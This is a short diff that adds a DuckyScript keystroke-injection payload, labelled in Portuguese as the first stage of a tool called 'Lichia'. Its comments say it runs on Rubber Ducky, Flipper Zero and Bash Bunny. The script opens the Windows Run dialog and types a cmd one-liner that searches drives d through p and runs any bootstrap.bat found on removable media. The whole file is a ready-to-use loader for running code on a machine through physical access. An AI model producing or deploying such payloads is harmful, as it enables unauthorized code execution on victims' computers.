@@ -1,0 +1,8 @@
+REM Lichia — first stage HID. abre o executar, varre drives removiveis, roda o bootstrap
+REM funciona em Rubber Ducky, Flipper Zero, Bash Bunny. adapte o DELAY ao SO alvo.
+DELAY 2000
+ESCAPE
+GUI r
+DELAY 500
+STRING cmd /v:on /c for %d in (d e f g h i j k l m n o p) do @if exist %d:\bootstrap.bat cmd /c %d:\bootstrap.bat
+ENTER
